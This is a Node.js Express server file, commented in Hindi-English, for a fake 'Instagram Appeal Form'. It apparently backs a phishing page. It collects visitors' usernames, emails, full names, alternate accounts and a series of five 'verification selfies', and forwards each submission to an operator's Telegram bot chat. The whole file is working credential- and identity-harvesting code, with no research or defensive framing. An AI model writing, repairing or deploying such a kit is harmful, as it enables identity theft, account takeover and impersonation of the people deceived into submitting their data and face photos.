const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error('❌ Token/Chat ID set nahi hai!');
}

app.use(express.json());
app.use(express.static('public'));

const upload = multer({ storage: multer.memoryStorage() });

// 1. Form Data (Text)
app.post('/api/submit-form', (req, res) => {
  const { type, username, email, fullname, alternative, relationship } = req.body;
  const message = `📋 <b>Instagram Appeal Form</b>\n\n<b>Type:</b> ${type}\n━━━━━━━━━━━━━━━━━━━━\n<b>👤 Username:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>🔗 Alt Account:</b> ${alternative || 'N/A'}\n<b>👥 Relationship:</b> ${relationship}\n━━━━━━━━━━━━━━━━━━━━\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
  sendTelegramMessage(message).then(() => res.json({ success: true })).catch(err => res.status(500).json({ error: 'Failed' }));
});

// 2. Selfie Photo (Yahan problem thi)
app.post('/api/submit-selfie', upload.single('photo'), (req, res) => {
  console.log('📸 Selfie request received');
  console.log('File info:', req.file); // Render Logs mein check karo

  const { username, formType, poseText, poseNumber } = req.body;
  if (!req.file) {
    console.log('❌ No file in request');
    return res.status(400).json({ error: 'No photo uploaded' });
  }

  const caption = `📸 <b>Verification Selfie ${poseNumber}/5</b>\n\n<b>👤 User:</b> ${username}\n<b>📝 Pose:</b> ${poseText}\n<b>📋 Type:</b> ${formType}\n<b>🕐 Time:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  sendTelegramPhoto(req.file.buffer, caption)
    .then(() => res.json({ success: true }))
    .catch(err => {
      console.error('Telegram Photo Error:', err);
      res.status(500).json({ error: 'Failed to send photo' });
    });
});

// 3. Verification Complete
app.post('/api/verification-complete', (req, res) => {
  const { username, email, fullname, formType } = req.body;
  const message = `✅ <b>VERIFICATION COMPLETED</b>\n\n<b>👤 User:</b> ${username}\n<b>📧 Email:</b> ${email}\n<b>📝 Name:</b> ${fullname}\n<b>📋 Form:</b> ${formType}\n<b>📸 Photos:</b> 5/5\n<b>✓ Status:</b> Ready for Review\n<b>🕐 Completed:</b> ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;
  sendTelegramMessage(message).then(() => res.json({ success: true })).catch(err => res.status(500).json({ error: 'Failed' }));
});

// ---------- Telegram Helpers (Native Fetch का use) ----------
async function sendTelegramMessage(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
  });
  if (!response.ok) throw new Error('Telegram sendMessage failed');
  return response.json();
}

async function sendTelegramPhoto(buffer, caption) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const formData = new FormData();
  formData.append('chat_id', CHAT_ID);
  formData.append('photo', buffer, 'selfie.jpg'); // Buffer + filename = Working!
  formData.append('caption', caption);
  formData.append('parse_mode', 'HTML');

  const response = await fetch(url, {
    method: 'POST',
    body: formData
  });
  
  if (!response.ok) {
    const errorText = await response.text();
    console.error('Telegram API Error Response:', errorText);
    throw new Error('Telegram sendPhoto failed');
  }
  return response.json();
}

app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
